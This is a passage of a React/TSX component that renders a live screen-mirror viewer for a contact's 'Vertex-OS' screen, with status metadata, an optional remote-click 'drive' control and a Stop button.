          <span className="gv-meta">{st.peer ?? "—"} · {st.latency !== null ? `${st.latency}ms` : "—"} · {st.status === "stream" ? "vertex-os screen" : "idle"}</span>
        </span>
      </header>
      <div className="gv-frame" ref={frameRef}>
        {st.snap ? renderMirrorScreen(st.snap, wallpaperResolve, cw, drive ? ((x, y) => sendGhostCtrl({ cmd: "click", x, y })) : undefined) : (
          <div className="gv-empty">
            <div className="gv-empty-ico">◉</div>
            <p>waiting for live frames…<br /><small>{st.status === "stream" ? "tunnel open — first frame incoming" : "session not active"}</small></p>
            <small className="gv-empty-foot">only your contact's Vertex-OS screen — nothing else</small>
          </div>
        )}
      </div>
      {st.status === "stream" && <GhostCtrlBar live={st.snap !== null} driveOn={drive} onDrive={setDrive} />}
      <footer className="gv-foot">
        <span>❖ live mirror · {st.peer ?? "no target"} · realtime frames</span>
        <button className="gv-btn gv-btn-stop" onClick={onStop} data-testid="gv-stop">Stop</button>
      </footer>
    </div>
  );
}